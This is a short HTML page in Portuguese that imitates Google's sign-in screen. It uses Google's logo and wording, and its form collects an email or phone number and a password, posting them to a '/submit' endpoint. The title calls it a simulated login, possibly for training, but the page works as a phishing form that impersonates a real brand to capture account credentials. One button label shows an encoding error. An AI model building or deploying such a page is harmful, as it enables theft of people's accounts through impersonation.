<!DOCTYPE html>
<html lang="pt">

<head>
    <meta charset="UTF-8">
    <title>Login Simulado do Google</title>
    <link rel="stylesheet" href="style-google.css">
</head>

<body>

    <div class="login-form">
        <img src="https://logo.clearbit.com/google.com" alt="Google Logo" class="logo">
        <h1>Fazer login</h1>
        <p>Use sua Conta do Google</p>
        <form id="googleLoginForm" action="/submit" method="post">
            <div class="form-group">
                <input type="email" id="email" name="email" placeholder="E-mail ou telefone" required autofocus>
            </div>
            <div class="form-group">
                <input type="password" id="senha" name="senha" placeholder="Digite sua senha" required>
            </div>
            <div class="form-group">
                <button type="submit">Pr√≥ximo</button>
            </div>
        </form>
    </div>

</body>

</html>
